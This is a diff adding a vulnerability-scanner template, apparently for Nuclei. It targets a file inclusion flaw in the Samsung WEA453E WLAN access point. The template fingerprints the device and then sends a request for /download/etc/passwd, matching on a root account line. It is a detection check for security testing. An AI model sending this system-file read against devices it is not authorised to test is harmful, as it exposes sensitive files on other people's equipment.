@@ -1,0 +1,43 @@
+id: samsung-wea453e-firmware-file-inclusion
+info:
+  name: Samsung WEA453E Firmware File Inclusion
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template identifies a firmware file inclusion vulnerability in the Samsung WEA453E WLAN AP, allowing access to sensitive files such as /etc/passwd.
+  reference:
+    - https://ireadyoulearn.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
+    - https://www.seebug.org/vuldb/ssvid-99075
+
+http:
+  - id: check-samsung-ap
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Samsung WLAN AP"
+        part: body
+
+  - id: check-file-inclusion
+    method: GET
+    path:
+      - "{{BaseURL}}/download/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:.*:/root:/bin/bash"
+        part: body
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
